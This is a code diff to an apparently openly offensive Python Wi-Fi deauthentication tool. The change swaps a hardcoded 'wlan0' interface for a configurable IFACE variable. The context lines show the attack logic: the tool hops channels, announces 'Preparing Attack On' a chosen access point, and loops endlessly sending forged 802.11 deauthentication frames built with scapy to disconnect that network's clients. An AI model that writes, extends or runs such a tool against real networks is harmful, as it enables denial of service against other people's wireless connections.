@@ -36,7 +36,7 @@ daemonFlag = True
 def channelHopper():	# switching channels using terminal
     while True: 
         channel = random.choice(channels)
-        os.system("iw dev wlan0 set channel {}".format(channel))
+        os.system("iw dev {} set channel {}".format(IFACE , channel))
         with lock:	# keeping track of current channel 
             global CURRENT_CHANNEL
             CURRENT_CHANNEL = channel
@@ -121,7 +121,7 @@ if (x == 0):
 os.system("clear")
 print(Fore.RED + "[!]Preparing Attack On -> " , devices_found_auto_filter[x-1][1],"~",devices_found_auto_filter[x-1][0],"~",devices_found_auto_filter[x-1][2] )
 
-os.system("sudo iw dev wlan0 set channel {}".format(devices_found_auto_filter[x-1][2]))
+os.system("sudo iw dev {} set channel {}".format(IFACE , devices_found_auto_filter[x-1][2]))
 
 clients = []
 MAC = devices_found_auto_filter[x-1][0]
@@ -192,7 +192,7 @@ try:
 	while True:
 		for client in clients:
 			packet = RadioTap()/Dot11(addr1 = client, addr2 = MAC , addr3 = MAC)/Dot11Deauth()
-			sendp(packet , iface = "wlan0")
+			sendp(packet , iface = IFACE)
 			dPackets = dPackets + 1
 except KeyboardInterrupt:
 	print("\n\nExiting.....")
